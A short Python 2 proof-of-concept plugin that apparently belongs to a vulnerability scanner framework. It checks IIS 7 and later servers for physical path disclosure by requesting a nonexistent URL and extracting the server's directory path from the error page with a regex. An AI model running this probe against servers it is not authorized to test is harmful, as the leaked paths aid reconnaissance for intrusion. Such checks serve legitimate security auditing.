#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import urlparse

"""
POC Name  :  IIS7以上物理路径泄露
References:  
Author    :  13
QQ        :  779408317
"""

def assign(service, arg):
    if service == "www":
        arr = urlparse.urlparse(arg)
        #只一个域名或者ip扫描一次
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg + 'testvulxxxxxxxxxxxxxxxxxxxx'
    code, head, body, error, _ = curl.curl(url)
    #修正正则，可匹配非中文情况
    m=re.search(r'</th><td>[(&nbsp;)]*(.+)\\testvulxxxxxxxxxxxxxxxxxxxx',body)
    if m:
        security_info(m.group(1))


        return arg
if __name__== '__main__':
    from dummy import *
